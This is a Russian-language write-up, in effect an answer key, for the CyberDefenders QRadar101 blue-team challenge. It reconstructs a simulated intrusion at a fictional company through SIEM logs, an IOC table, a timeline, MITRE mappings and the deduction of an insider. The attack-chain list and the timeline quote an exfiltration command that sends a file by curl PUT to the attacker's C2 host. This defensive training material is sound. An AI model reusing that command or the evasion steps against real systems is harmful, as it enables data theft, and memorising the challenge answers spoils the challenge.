
# QRadar101 — CyberDefenders 

Разбор кейса реагирования на инцидент (Incident Response) с использованием **IBM QRadar SIEM**. Компания **HackDefend** подверглась целевой атаке; в рамках расследования восстановлена полная цепочка компрометации — от первичного проникновения до эксфильтрации данных и выявления инсайдера.

- **Платформа:** CyberDefenders — [QRadar101](https://cyberdefenders.org/blueteam-ctf-challenges/qradar101/)
- **Инструменты:** IBM QRadar (SIEM), Suricata (IDS), Zeek, Sysmon, Windows Event Logs
- **Тип атаки:** Целевое проникновение с признаками инсайдерского участия

---

## 📌 Ключевые факты

| Параметр | Значение |
|---|---|
| IDS/мониторинг сети | **Suricata** (в составе Security Onion) |
| Домен компании | `hackdefend.local` |
| C2-сервер атакующего | `192.20.80.25` (`nothing.attdns.com`) |
| Контроллер домена | `192.168.20.20` |
| Первая скомпрометированная машина | `HD-FIN-03` (`192.168.10.15`) |
| Скомпрометированный пользователь | `nour` |
| Инструмент бокового перемещения | `wmiexec.py` (Impacket) |
| Эксфильтрованный файл | `sami.xlsx` |
| Инсайдер | **Sami** |

---

## 🔗 Цепочка атаки (Attack Chain / MITRE ATT&CK)

```
1. Initial Access        → Metasploit-эксплойт на HD-FIN-03 (польз. nour)
2. Execution              → PowerShell-сессия
3. Discovery               → поиск проектных файлов (project48)
4. Defense Evasion         → проверка ScriptBlockLogging
5. C2 Communication        → FSETPBEUsIek.exe → 192.20.80.25:449
6. Discovery (AD recon)    → notepad.exe (process injection) → LDAP → DC
7. Privilege Escalation    → получены права HACKDEFEND\Administrator
8. Lateral Movement        → wmiexec.py (Impacket) → HD-fin-02
9. Persistence              → Registry Run Key (T1547.001)
10. Discovery (network)     → ICMP-скан 192.168.20.1–30
11. Collection               → dir sarah.Hackdefend (поиск файлов)
12. Exfiltration              → curl -X PUT sami.xlsx → C2-сервер
13. Cover-up                  → удаление sami.xlsx на MGNT-01
```

---

## 🕒 Хронология (Timeline)

| Время (UTC) | Хост | Событие |
|---|---|---|
| **08 ноя, 22:30:46** | HD-FIN-03 (192.168.10.15) | Запуск `FSETPBEUsIek.exe` под nour → C2-соединение на `192.20.80.25:449` |
| **08 ноя, 22:39:44** | HD-FIN-03 | PowerShell: `Get-ChildItem -Filter project48 -Recurse` |
| **08 ноя, 22:53:53** | HD-FIN-03 | Запуск новой PowerShell-консоли, проверка логирования |
| **08 ноя, 23:14:02** | HD-FIN-03 → DC (192.168.20.20) | `notepad.exe` (инъекция кода) → LDAP (порт 389) — первое обращение к DC |
| **09 ноя, 10:23:12** | HD-fin-02 (192.168.10.29) | Открыта сессия `wmiexec` (Impacket), права Administrator |
| **09 ноя, 10:25:48** | HD-fin-02 | `dir sarah.Hackdefend` — разведка папки сотрудника |
| **09 ноя, 10:29:48** | HD-fin-02 | `curl -X PUT sami.xlsx → 192.20.80.25:8000` — эксфильтрация |
| **09 ноя, ~позже** | MGNT-01 (192.168.13.11) | Удаление `sami.xlsx` — попытка сокрытия улики |

---

## 🌐 Сетевые соединения (Sysmon Event ID 3)

**1. Первичное заражение / C2**
```
Хост:        HD-FIN-03 (192.168.10.15:50026)
Процесс:     FSETPBEUsIek.exe (польз. nour)
Назначение:  192.20.80.25:449 (nothing.attdns.com)
```

**2. Первое соединение к контроллеру домена**
```
Хост:        HD-FIN-03 (192.168.10.15:50149) → DC
Процесс:     notepad.exe (process injection)
Назначение:  192.168.20.20:389 (LDAP)
```

---

## 🕵️ Как выявлен инсайдер

**Подсказки задания:**
> 1. Examine the exfiltrated data for clues about insider involvement.
> 2. Focus on any files or communications related to internal personnel.

**Логика:**
1. Атакующий (уже как Administrator, через wmiexec) целенаправленно заходит в папку сотрудника **`C:\Users\sarah.Hackdefend`**.
2. Через 4 минуты находит и выгружает файл **`sami.xlsx`** — единственный найденный файл, названный именем человека, а не проекта.
3. Позже, на другой машине (**MGNT-01**), атакующий **удаляет** этот же файл — то есть целенаправленно пытается скрыть его существование.
4. Единственная "зацепка на инсайдера" во всём датасете — имя файла **sami.xlsx**.

**Вывод:** сотрудник **Sami** — инсайдер, причастный к организации атаки.

---

## 🧰 Использованные техники MITRE ATT&CK

| Тактика | Техника | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Discovery | File and Directory Discovery | T1083 |
| Defense Evasion | Impair Defenses (Disable Logging) | T1562.002 |
| Defense Evasion | Process Injection | T1055 |
| Lateral Movement | Remote Services (WMI) | T1021.006 |
| Persistence | Registry Run Keys | T1547.001 |
| Discovery | Network Service Discovery / Ping Sweep | T1046 |
| Collection | Data from Local System | T1005 |
| Exfiltration | Exfiltration Over Web Service | T1567 |
| Impact/Defense Evasion | File Deletion (anti-forensics) | T1070.004 |

---


